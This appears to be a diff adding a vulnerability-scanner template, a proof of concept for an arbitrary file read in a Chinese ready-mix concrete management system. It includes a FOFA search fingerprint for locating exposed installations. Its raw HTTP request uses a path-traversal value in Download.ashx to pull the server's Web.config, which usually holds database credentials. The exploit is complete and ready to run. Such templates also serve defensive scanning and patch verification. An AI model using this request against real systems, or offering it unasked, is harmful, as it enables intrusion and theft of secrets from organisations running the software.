@@ -1,0 +1,23 @@
+id: poc-zxhz8y39mqcgemal
+info:
+  name: 预拌砼综合管理系统Download.ashx存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zxhz8y39mqcgemal'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zxhz8y39mqcgemal
+    fofa: body="Libs/Platform.lib"
+http:
+- raw:
+  - 'GET /WebUpload/Download.ashx?fname=1.txt&path=/../Web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
